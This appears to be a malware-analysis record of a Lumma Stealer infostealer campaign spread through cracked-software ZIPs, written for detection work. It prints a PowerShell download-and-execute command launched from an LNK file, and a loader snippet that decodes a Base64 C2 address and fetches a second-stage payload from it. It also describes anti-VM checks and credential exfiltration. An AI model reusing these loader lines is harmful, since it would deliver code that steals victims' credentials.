package_info.package_name: Lumma Stealer Variant (delivered via cracked software YouTube campaign)
package_info.package_manager: N/A (malware distributed as ZIP containing LNK, .NET EXE, DLL)
package_info.package_versions: N/A (campaign-based, not versioned as a package)
package_info.why_malicious: The entire package chain is engineered to covertly deliver and execute the Lumma Stealer infostealer malware. It leverages deceptive cracked software lures, multi-stage obfuscated loaders, anti-analysis and anti-VM techniques, and automated credential and data exfiltration to attacker-controlled C2 infrastructure. The delivery method, execution flow, and payload behaviors are all consistent with advanced, evasive malware campaigns.

execution_context.trigger: user execution (via LNK file in ZIP)

malicious_snippets.code_snippet:
LNK file calls PowerShell to download and execute a .NET EXE from GitHub:
powershell -Command "Invoke-WebRequest -Uri 'hxxps://github[.]com/John1323456/New/raw/main/Installer-Install-2023_v0y.6.6.exe' -OutFile 'Installer-Install-2023_v0y.6.6.exe'; Start-Process 'Installer-Install-2023_v0y.6.6.exe'"
malicious_snippets.code_behavior: On user execution, the LNK file launches PowerShell to download a remote .NET executable from GitHub and execute it, initiating the malware chain.

malice_analysis.why_suspicious: LNK files embedded in cracked software ZIPs that invoke PowerShell to download and execute remote binaries are a well-documented malware delivery tactic, often used to bypass browser and OS protections.
malice_analysis.violated_expectations: Legitimate software installers do not use shortcut (LNK) files to silently invoke PowerShell for remote code download and execution without user awareness or consent.
malice_analysis.similar_legitimate_use: Enterprise IT automation may use PowerShell for remote software deployment, but consumer software installers should never use LNK files to trigger such actions.
key_indicators: No user prompt or consent for code execution
Presence of LNK in cracked software ZIP

malicious_snippets.code_behavior: At runtime, the obfuscated .NET loader checks system environment variables for anti-analysis, launches a hidden PowerShell process with redirected input, and injects a malicious script for further execution.

malice_analysis.why_suspicious: Obfuscated .NET loaders that perform environment-based anti-analysis checks and spawn hidden PowerShell processes are characteristic of sophisticated malware loaders designed to evade detection and analysis.
malice_analysis.violated_expectations: Normal software installers do not obfuscate their code, perform anti-analysis environment checks, or launch hidden PowerShell sessions to execute additional scripts.
malice_analysis.similar_legitimate_use: Some enterprise deployment tools may use hidden PowerShell for automation, but this is not expected in consumer-facing software installers.
key_indicators: Hidden PowerShell process with redirected input

malicious_snippets.code_snippet:
# PowerShell (partial, as described)
$ip_b64 = 'MTc2LjExMy4xMTUuMjI0'; # Base64 for 176.113.115.224
$ip = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($ip_b64))
# Selects server based on system date
Invoke-WebRequest -Uri "http://$ip:29983" -OutFile "stage2.bin"
# Decrypts with AES CBC, decompresses with GZip, loads DLL via [System.Reflection.Assembly]::Load()
malicious_snippets.code_behavior: At runtime, the injected PowerShell script decodes a Base64-encoded C2 server IP, selects a server based on system date, downloads an encrypted payload, decrypts and decompresses it, and loads a DLL into memory for execution.

malice_analysis.why_suspicious: Dynamic C2 selection, encrypted payload delivery, and in-memory DLL loading are advanced malware techniques used to evade static detection and hinder analysis.
malice_analysis.violated_expectations: Legitimate scripts do not download, decrypt, and execute code from untrusted remote servers, nor do they use encoded C2 addresses and in-memory execution.
malice_analysis.similar_legitimate_use: Some legitimate updaters may download and execute code, but not with encrypted payloads, dynamic C2 selection, or in-memory DLL loading from untrusted sources.
key_indicators: GZip decompression and in-memory DLL loading

malicious_snippets.code_behavior: At runtime, the loaded DLL performs anti-VM and anti-debug checks by inspecting window titles, loaded modules, usernames, WMI manufacturer, and specific files, then suspends its thread to prepare for payload injection.

malice_analysis.why_suspicious: Comprehensive anti-analysis logic, including checks for debuggers, sandboxes, virtualization artifacts, and suspicious usernames, is a hallmark of evasive malware aiming to avoid detection and analysis.
malice_analysis.violated_expectations: Legitimate DLLs do not perform extensive anti-VM or anti-debug checks, nor do they suspend their own threads for code injection.
malice_analysis.similar_legitimate_use: Some security software may check for virtualization, but not with this breadth or in this context.
key_indicators: Checks for debugger and sandbox artifacts (window titles, modules, files)

POST /api HTTP/1.1
... (compressed, exfiltrated data)
malicious_snippets.code_behavior: At runtime, the Lumma Stealer payload connects to a C2 server, performs an initial check-in, receives instructions, collects sensitive data (system info, credentials, browser data), and exfiltrates compressed stolen data via HTTPS POST requests.

malice_analysis.why_suspicious: Automated collection and exfiltration of sensitive user data to remote C2 servers is a core indicator of infostealer malware, especially when using obfuscated network traffic and hardcoded C2 endpoints.
malice_analysis.violated_expectations: Legitimate software does not collect and exfiltrate user credentials, browser data, or system information to unknown servers.
malice_analysis.similar_legitimate_use: Some enterprise management tools may collect system info, but not credentials or browser data, and not exfiltrate to untrusted servers.
key_indicators: Automated data exfiltration via HTTPS POST
Collection of credentials and browser data

attack_chain.action: User downloads ZIP from YouTube link and executes LNK file, which launches PowerShell to download .NET loader.
Obfuscated .NET loader performs environment checks and launches hidden PowerShell with malicious script.
PowerShell script selects C2, downloads encrypted payload, decrypts and decompresses DLL, loads it in memory.
DLL performs anti-VM/anti-debug checks, prepares for payload injection.
Lumma Stealer payload collects and exfiltrates sensitive data to C2 server.

behavioral_signatures: LNK files in ZIP archives that launch PowerShell to download and execute remote binaries
Obfuscated .NET loaders (SmartAssembly) performing environment-based anti-analysis checks and spawning hidden PowerShell processes
PowerShell scripts decoding Base64 C2 addresses, downloading AES-encrypted payloads, and loading DLLs in memory
DLLs performing anti-VM/anti-debug checks and suspending threads for code injection
Automated HTTPS POST exfiltration of compressed and obfuscated data to hardcoded C2 endpoints
file_indicators: Presence of LNK files invoking PowerShell in cracked software ZIPs
detection_knowledge.how_to_detect: Monitor for LNK files in user downloads that invoke PowerShell to fetch and execute remote executables, especially from file-sharing or GitHub URLs. Detect obfuscated .NET binaries with SmartAssembly signatures and hidden PowerShell process launches. Flag PowerShell scripts that decode Base64 C2 addresses, download AES-encrypted payloads, and perform in-memory DLL loading. Alert on DLLs performing anti-VM/anti-debug checks and thread suspension. Monitor for outbound HTTPS POST requests to known Lumma Stealer C2 IPs/domains, particularly with compressed or encrypted payloads indicative of data exfiltration.
